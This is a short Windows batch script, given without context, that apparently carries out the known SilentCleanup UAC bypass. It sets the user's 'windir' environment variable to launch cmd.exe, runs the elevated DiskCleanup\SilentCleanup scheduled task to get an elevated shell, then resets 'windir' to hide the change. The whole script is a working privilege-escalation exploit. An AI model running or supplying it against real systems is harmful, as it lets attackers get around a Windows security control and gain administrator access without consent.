@echo off
reg add HKCU\Environment /t REG_SZ /v windir /d "c:\windows\..\windows\system32\cmd.exe /c \"cd %HOMEPATH% ^&^& C:\windows\system32\cmd.exe\";c:\windows" /f
schtasks.exe /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I
reg add HKCU\Environment /t REG_SZ /v windir /d "C:\WINDOWS" /f